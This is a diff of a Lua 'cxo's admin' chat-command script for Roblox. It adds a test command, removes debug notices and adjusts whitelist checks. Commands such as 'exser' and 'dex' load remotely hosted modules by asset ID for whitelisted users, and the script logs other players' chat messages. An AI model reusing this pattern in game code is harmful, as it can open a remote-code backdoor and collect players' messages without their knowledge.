@@ -593,11 +593,18 @@ addcmd({
 })
 
 addcmd({
+	Name = "test",
+	Aliases = {},
+	Function = function(sender, targets, arguments)
+		notfi(sender, "cxo's admin", "b")
+	end
+})
+
+
+addcmd({
 	Name = "exser",
 	Aliases = {},
 	Function = function(sender, targets, arguments)
-		notfi(sender, "debug", sender.Name)
-
 		local success, fail = pcall(function()
 			require(10868847330):pls(sender.Name)
 		end)
@@ -617,8 +624,6 @@ addcmd({
 	Name = "dex",
 	Aliases = {},
 	Function = function(sender, targets, arguments)
-		notfi(sender, "debug", sender.Name)
-
 		local success, fail = pcall(function()
 			require(15827159924).MauDex(sender.Name)
 		end)
@@ -959,14 +964,14 @@ addcmd({
 })
 
 for i,v in pairs(game.Players:GetPlayers()) do
-	if table.find(Whitelist, tostring(v.UserId)) or table.find(TempWhitelist, tostring(v.UserId)) then
+	if table.find(Whitelist, tostring(v.UserId)) or table.find(TempWhitelist, v.UserId) then
 		notfi(v, "cxo's admin", "You are whitelisted! prefix is ".. prefix)
 	end
 	v.Chatted:Connect(function(msg)
-		if not table.find(Whitelist, tostring(v.UserId)) and not table.find(TempWhitelist, tostring(v.UserId)) then
+		if not table.find(Whitelist, tostring(v.UserId)) and not table.find(TempWhitelist, v.UserId) then
 			table.insert(chats, v.Name ..":" .. msg)
 		end
-		if table.find(Whitelist, tostring(v.UserId)) or table.find(TempWhitelist, tostring(v.UserId)) then
+		if table.find(Whitelist, tostring(v.UserId)) or table.find(TempWhitelist, v.UserId) then
 			print(v.Name .. ": ".. msg)
 			if msg:sub(1, #prefix) == prefix then
 				msg = msg:sub(#prefix + 1)
@@ -1003,15 +1008,15 @@ for i,v in pairs(game.Players:GetPlayers()) do
 end
 
 game.Players.PlayerAdded:Connect(function(player)
-	if table.find(Whitelist, tostring(player.UserId)) or table.find(TempWhitelist, tostring(player.UserId)) then
+	if table.find(Whitelist, tostring(player.UserId)) or table.find(TempWhitelist, player.UserId) then
 		task.wait(1.5)
 		notfi(player, "cxo's admin", "You are whitelisted! prefix is ".. prefix)
 	end
 	player.Chatted:Connect(function(msg)
-		if not table.find(Whitelist, player.Name) and not table.find(TempWhitelist, tostring(player.UserId)) then
+		if not table.find(Whitelist, player.Name) and not table.find(TempWhitelist, player.UserId) then
 			table.insert(chats, player.Name ..":" .. msg)
 		end
-		if table.find(Whitelist, tostring(player.UserId)) or table.find(TempWhitelist, tostring(player.UserId)) then
+		if table.find(Whitelist, tostring(player.UserId)) or table.find(TempWhitelist, player.UserId) then
 			if msg:sub(1, #prefix) == prefix then
 				msg = msg:sub(#prefix + 1)
 				local parts = msg:split(" ")
